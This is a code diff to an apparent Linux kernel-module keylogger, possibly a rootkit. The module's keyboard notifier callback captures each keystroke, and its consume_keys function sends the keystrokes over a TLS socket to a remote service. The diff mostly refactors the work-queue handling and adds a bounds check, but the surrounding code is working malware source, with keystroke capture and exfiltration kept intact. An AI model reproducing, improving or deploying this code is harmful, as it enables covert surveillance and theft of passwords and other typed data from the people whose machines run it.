@@ -14,8 +14,8 @@
 #include <linux/keyboard.h>
 #include <linux/kthread.h>
 #include <linux/module.h>
-#include <linux/net.h>
 #include <linux/namei.h>
+#include <linux/net.h>
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
 #include <linux/path.h>
@@ -81,10 +81,8 @@ struct dir_context* backup_ctx;
 
 void consume_keys(struct work_struct* work);
 
-struct my_work {
-    const char* keylog_data;
-    struct work_struct ws;
-} key_work;
+static const char* keylog_data;
+static struct work_struct key_work;
 
 int send_msg(struct socket* sock, unsigned char* buf, size_t len);
 int recv_msg(struct socket* sock, unsigned char* buf, size_t len);
@@ -541,7 +539,7 @@ int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _para
     }
 
     //119 is the highest keycode we can translate
-    if (param->value <= 119) {
+    if (param->value <= 119 && param->shift < 2) {
         keycode = us_keymap[param->value][param->shift];
     } else {
         return NOTIFY_OK;
@@ -551,19 +549,19 @@ int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _para
         return NOTIFY_OK;
     }
 
-    //Can't just write directly inside an interrupt context, so use a circular buffer to pass to a different thread
     printk(KERN_INFO "Keycode: %s\n", keycode);
 
-    key_work.keylog_data = keycode;
-    INIT_WORK(&key_work.ws, &consume_keys);
-    schedule_work(&key_work.ws);
+    keylog_data = keycode;
+
+    INIT_WORK(&key_work, &consume_keys);
+    schedule_work(&key_work);
 
     return NOTIFY_OK;
 }
 
 void consume_keys(struct work_struct* work) {
     unsigned char buffer[30];
-    const char* keystroke = key_work.keylog_data;
+    const char* keystroke = keylog_data;
     if (!keystroke) {
         return;
     }
@@ -571,7 +569,6 @@ void consume_keys(struct work_struct* work) {
     buffer[0] = 'k';
     strcpy((char*) buffer + 1, keystroke);
 
-    //send_msg(svc->tls_socket, (unsigned char*) keystroke, strlen(keystroke));
     send_msg(svc->tls_socket, buffer, strlen((const char*) buffer));
     printk(KERN_INFO "Sent keystroke %s\n", keystroke);
 }
